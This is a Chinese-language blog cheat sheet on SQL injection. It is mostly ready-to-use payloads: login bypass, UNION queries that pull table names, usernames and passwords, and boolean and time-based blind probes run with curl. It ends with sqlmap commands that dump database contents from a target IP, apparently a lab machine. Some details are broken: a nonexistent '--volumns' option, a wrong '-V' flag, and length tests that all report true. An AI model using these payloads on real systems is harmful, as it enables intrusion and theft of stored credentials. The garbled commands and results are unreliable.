---
title: SQL 注入精要
date: 2026-03-21T15:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## 手工注入

### 简单的注入

当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。

```bash
' or 1=1 -- -
```

### 探测 Columns

确认有 sql 注入漏洞后可使用 `order by` 或 `group by` 探测 Columns。
`
```bash
' order by 3 -- -
```

### 联合查询

使用 `union` 进一步探测信息。

探测显示数据的位置，这里假设为 3。

```bash
' union select 1,2,3 -- -
```

探测数据库的版本。

```bash
' union select 1,2,version() -- -
```

探测数据库名称。

```bash
' union select 1,2,database() -- -
```

探测用户名称。

```bash
' union select 1,2,user() -- -
```

探测 Tables 表。

```bash
' union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
```

探测 Tables 名。

```bash
' union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
```

探测 Columns 表。

```bash
' union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name='users' -- -
```

探测 Users。

```bash
' union select 1,2,user from users -- -
```

探测 Password。

```bash
' union select 1,2,pass from users -- -
```

### 复合 union 查询

`group_concat` 将多行结果合并成一个逗号分割的字符串，如 `enil,malus,marcbark,enilmalus`。

```bash
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```

### Boolean 盲注

有时候网页仅返回 `True` or `False`，可以利用判断注入是否正确。

测试数据库名称有多少字符。

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 1 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 2 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 4 -- -
result：true
```

```bash
curl "http://10.10.10.15/index.php?search=' and (length(database())) = 5 -- -
result：false
```

逐个判断字，`substr(字符串,起始位a,长度1)` 街区数据库的第 a 个字符。

```bash
curl "http://10.10.10.15/index.php?search=' and (ascii(substr((select database()),1,1))) = 115 -- -
result：false
```

### Time 盲注

有时页面无任何回显、真假响应时间也一致，可以通过让数据库响应延迟来判断注入的对错。

```bash
条件为真 → sleep(5) → 响应延迟 5 秒 → 猜测正确
条件为假 → 不触发   → 响应立即返回 → 猜测错误
```

判断是否存在注入。

```bash
' and sleep(5) -- -
```

判断数据库名称长度。

```bash
' and if(length(database()) = 8,sleep(5),0) -- -
```

## Sqlmap 自动注入

### 常用注入流程

使用 sqlmap 探测数据库信息，强度为 level 3，level 默认为 1，数字越大强度越高。

```bash
sudo sqlmap -u "http://10.10.10.15/login" --dbs --level 3 --batch
```

探测 tables。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils --tables --level 3 --batch
```

探测 volumns。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus --volumns --level 3 --batch
```

爆破数据。

```bash
sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus -V marcbark --dump --level 3 --batch
```

- level：1 为快速扫描，只测试基础的注入点；2 新增对 Cookie 的检测；3 测试 HTTP 请求头，适合怀疑头注入的场景；4 测试 Host 头，并测试更复杂的编码方式；5 最全面，测试所有的 HTTP 头
- risk：1 只使用 SELECT 语句测试，不修改数据；2 加入基于时间的盲注；3 加入 OR 型注入